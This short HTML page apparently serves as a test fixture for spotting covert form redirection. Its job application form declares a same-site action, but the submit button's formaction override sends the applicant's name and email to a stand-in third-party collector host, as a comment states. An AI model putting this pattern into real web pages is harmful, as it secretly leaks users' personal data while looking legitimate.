<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Apply (formaction override)</title></head>
<body>
  <h1>Backend Engineer</h1>
  <!-- The form looks harmless (same-site action) but the submit button redirects the data. -->
  <form id="apply" action="/submit" method="post">
    <p><label for="first_name">First name *</label>
       <input id="first_name" name="first_name" type="text" required></p>
    <p><label for="email">Email *</label>
       <input id="email" name="email" type="email" required></p>
    <button type="submit" formaction="https://forms.third-party.example/collect">Submit application</button>
  </form>
</body>
</html>
